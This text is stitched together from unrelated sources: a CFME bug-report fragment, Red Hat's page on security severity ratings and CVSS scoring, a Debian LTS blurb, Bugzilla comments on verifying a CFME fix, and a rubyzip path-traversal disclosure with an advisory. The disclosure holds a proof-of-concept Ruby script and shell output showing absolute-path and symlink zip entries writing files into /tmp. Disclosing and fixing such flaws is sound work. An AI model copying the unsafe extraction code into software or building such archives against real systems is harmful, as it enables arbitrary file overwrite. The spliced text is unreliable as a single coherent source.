However in 4.6, many of the fields are in English.  Version-Release number of selected component (if applicable): CFME 5.9.2  How reproducible: Always  Steps to Reproduce: 1.  Set locale to French 2. 3.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

# Debian Long Term Support

Debian Long Term Support (LTS) is a project to extend the lifetime of all Debian stable releases to (at least) 5 years. Debian LTS is not handled by the Debian Security and Release teams, but by a separate group of volunteers and companies interested in making it a success.

Thus the Debian LTS team takes over security maintenance of the various releases once the Debian Security team stops its work.

Restored DB .  Service - request does not show any requests. I ordered one request and it is showing fine . Please check once .  Thanks,  Shveta   ```  [Comment 4](show_bug.cgi?id=1641810#c4)  Joe Rafaniello    2018-10-29 11:20:26 UTC  ``` > Restored DB .  Service - request does not show any requests. I ordered one request and it is showing fine .  Hi Shveta,  Login as admin and verify which user role has the managed/tag filter that contains a tag expression.  Create a user for yourself that has this role and then try to login as them.  Then, if you have requests in your database, if you go to services -> requests, this page will fail to load with an error (before the fix).  Once that is verified, try it on the fixed version, it should load with no issues.  I'll be online in a few hours if you have any questions.  Please contact me on gitter or ask me here.  Thanks!  Thanks, Joe   ```  [Comment 5](show_bug.cgi?id=1641810#c5)  Shveta    2018-10-29 20:08:10 UTC  ``` Please have a look at 10.8.199.237. Getting error while restoring DB . <http://pastebin.test.redhat.com/663694>   ```  [Comment 6](show_bug.cgi?id=1641810#c6)  Gregg Tanzillo    2018-10-30 12:44:53 UTC  ``` Hi Shveta, Looking at the pastebin, it seems that the error you are getting during the restore is due to the fact that the DB has open connections -  pg_restore: [archiver (db)] could not execute query: ERROR:  cannot drop the currently open database     Command was: DROP DATABASE vmdb_production;  After that there are errors/warnings on every table it tries to restore.  You need to make sure that all connections are closed before attemting to drop and restore the DB   ```  [Comment 7](show_bug.cgi?id=1641810#c7)  Joe Rafaniello    2018-10-30 13:55:09 UTC  ``` Hi Shveta, I posted this directly to you but will copy this here.  The steps for this BZ are causing you to hit numerous errors. One, what GreggT posted in [comment #6](show_bug.cgi?id=1641810#c6).  Also, you're hitting the issue during fix_auth being looked at in [bug #1643250](show_bug.cgi?id=1643250 "CLOSED NOTABUG - EVM server won't start after restoring DB").  While, it would be great to be able to use this exact database to recreate the problem and then verify the new build fixes it, it's not necessary.  You can do one of the following: 1) Use an existing database export containing services and a user role with a tag filter (Managed -> environment -> production) that does get through fix_auth... or  2) Take an empty database.  Create a new user role, from an existing one, add a Managed -> environment -> production tag for that user role, assign a group to this role, and add a user into this group.  As an admin, create a request, such as a provision request, then try to login as the user with this production tag.  With the old codebase, if you go to requests, it will blow up with the reported find_tagged_with error.  With the fixed code, it will show the request, since requests don't participate in tag based filtering.   ```  [Comment 8](show_bug.cgi?id=1641810#c8)  Joe Rafaniello    2018-10-30 13:56:44 UTC  ``` Part 1) should say "Use an existing database export containing requests"... not services   ```  [Comment 9](show_bug.cgi?id=1641810#c9)  Joe Rafaniello    2018-10-30 13:58:29 UTC  ``` We can continue to investigate the issues you're having with this specific database export outside of this bugzilla.   ```  [Comment 10](show_bug.cgi?id=1641810#c10)  Shveta    2018-10-30 17:22:10 UTC  ``` Hi Joe ,   Verified this BZ with the steps in part 2 mentioned above. Appliance - <https://10.8.198.15> Verison - 5.9.5.3.20181023135339_256263f  Created a role bz_role in appliance . Created a group tagged with Environment- Production . User belonging to that group . Created request . Logged in as user , request shows without error . Please take a look once before I move it to verified .   ```  [Comment 11](show_bug.cgi?id=1641810#c11)  Joe Rafaniello    2018-10-30 17:50:30 UTC  ``` That looks good to me Shveta   ```  [Comment 13](show_bug.cgi?id=1641810#c13)  errata-xmlrpc    2018-11-05 14:00:33 UTC  ``` Since the problem described in this bug report should be resolved in a recent advisory, it has been closed with a resolution of ERRATA.

## Description

[![@tuzovakaoff](https://avatars.githubusercontent.com/u/1527658?u=6280fc12a20dd0eaf9a4a8b5ff9ec807ec2bf729&v=4&size=48)](/tuzovakaoff)[tuzovakaoff](https://github.com/tuzovakaoff)opened [on Jun 14, 2018](https://github.com/rubyzip/rubyzip/issues/369#issue-332518678)
## Overview

This issue is similar to already closed [#315](https://github.com/rubyzip/rubyzip/issues/315) but I found two ways to bypass that fix.

You can find files for tests in <https://github.com/tuzovakaoff/zip_path_traversal>

## Proof of concept:

##### rubyzip.rb

```
require 'zip'
first_arg, *the_rest = ARGV

Zip::File.open(first_arg) do |zip_file|
  zip_file.each do |entry|
    puts "Extracting #{entry.name}"
    entry.extract(entry.name)
  end
end
```
### 1. Files with absolute path

#### UnZip strips absolute path

```
> ls
absolutepath.zip        rubyzip.rb              symlink.zip

> unzip absolutepath.zip
Archive:  absolutepath.zip
warning:  stripped absolute path spec from /tmp/
   creating: tmp/
warning:  stripped absolute path spec from /tmp/file.txt
  inflating: tmp/file.txt

> ls
absolutepath.zip	symlink.zip
rubyzip.rb		tmp
```
#### rubyzip extracts files with absolute path

```
> ls
absolutepath.zip        rubyzip.rb              symlink.zip

> ruby rubyzip.rb absolutepath.zip
Extracting /tmp/
Extracting /tmp/file.txt

> ls
absolutepath.zip        rubyzip.rb              symlink.zip

> ls /tmp
file.txt

```
### 2. Archive with symbolic link

#### UnZip extracts only symbolic link

```
> unzip symlink.zip
Archive:  symlink.zip
    linking: path                    -> ../../../../../tmp
checkdir error:  path exists but is not directory
                 unable to process path/file.txt.
finishing deferred symbolic links:
  path                   -> ../../../../../tmp

> ls -l path
lrwxr-xr-x  1 user  group  18 Jun 14 21:19 path -> ../../../../../tmp

```
#### rubyzip extracts symbolic link and puts file into `/tmp` folder

```
> ruby rubyzip.rb symlink.zip
Extracting path
Extracting path/file.txt

> ls -l path
lrwxr-xr-x  1 user  group  18 Jun 14 21:22 path -> ../../../../../tmp

>ls /tmp
file.txt

```

Package        : ruby-zip
Version        : 1.2.0-1.1+deb9u1
CVE ID         : CVE-2018-1000544
Debian Bug     : 902720

rubyzip gem version 1.2.1 and earlier contains a Directory Traversal
vulnerability in Zip::File component that can result in write
arbitrary files to the filesystem.

This attack appear to be exploitable via if a site allows
uploading of .zip files, an attacker can upload a malicious file
that contains symlinks or files with absolute pathnames "../"
to write arbitrary files to the filesystem..

For Debian 9 stretch, this problem has been fixed in version
1.2.0-1.1+deb9u1.

We recommend that you upgrade your ruby-zip packages.

For the detailed security status of ruby-zip please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/ruby-zip>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

Best,
Utkarsh

| [Description](show_bug.cgi?id=1593001#c0)  Laura Pardo    2018-06-19 20:19:24 UTC  ``` A vulnerability has been found in the way developers have implemented the archive extraction of files. An arbitrary file write vulnerability, that can be achieved using a specially crafted zip archive (affects other archives as well, bzip2, tar,xz, war, cpio, 7z), that holds path traversal filenames. So when the filename gets concatenated to the target extraction directory, the final path ends up outside of the target folder. Of course if an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily. This affects multiple libraries that lacks of a high level APIs that provide the archive extraction functionality.
